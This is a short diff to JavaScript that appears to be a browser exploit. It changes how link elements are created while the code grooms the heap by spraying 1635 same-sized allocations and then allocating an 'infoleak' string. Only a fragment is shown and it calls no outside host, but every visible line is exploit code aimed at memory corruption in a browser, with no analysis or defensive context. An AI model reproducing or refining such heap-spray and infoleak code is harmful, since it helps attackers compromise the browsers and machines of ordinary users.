@@ -4,6 +4,7 @@
 function pow2str(p, b) {
   var str = String.fromCharCode(b);
   for (; p; p--){
+  document.createElement("link");
     str += str;
   }
   return str;
@@ -95,8 +96,6 @@ for(var i = 0; i < 1635; i++) {
   holder.push(alloc(0x1A0 - 0x20, 1));
 }
 
-// Create link element.
-elem = document.createElement("link");
 
 // Allocate infoleak string.
 target = alloc(0x1A0 - 0x20, 2);
